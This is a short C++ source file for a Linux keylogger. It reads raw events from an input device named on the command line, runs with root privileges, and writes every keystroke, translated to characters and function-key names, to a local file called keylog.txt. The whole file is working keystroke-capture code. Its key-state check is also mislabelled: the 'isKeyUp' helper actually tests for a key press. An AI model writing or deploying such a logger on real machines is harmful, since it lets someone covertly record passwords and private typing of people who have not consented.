#include <linux/input.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <array>
#include <iostream>
#include <fstream>
#include "keytables.h"
using namespace std;

bool isKeyUp(int keyStatus) {
    return keyStatus == 1;
}

int main(int argc, char **argv) {
    int device_fd;
    // Is args correct?
    if(argc < 2) {
        cout << "Usage: sudo " << argv[0] << " <device>\n" << endl;
        return 1;
    } else {
        device_fd = open(argv[1], O_RDONLY);
    }

    // Error handling
    if (device_fd == -1) {
        cout << "- Error opening device descriptor" << endl;
        return 1;
    } else {
        cout << "+ Logging " << argv[1] << endl;
    }

    // Actual logic
    ofstream logFile("keylog.txt");
    input_event event;
    while(true) {
        read(device_fd, &event, sizeof(input_event));

        if(event.type == 1) {
            printf("key %i state %i\n", event.code, event.value);

            if (!isKeyUp(event.value)) {
                if (is_char_key(event.code))
                    logFile << charCode_to_char(event.code);
                else if (is_func_key(event.code))
                    logFile << funcCode_to_string(event.code);

                flush(logFile);
            }
        }
    }
}
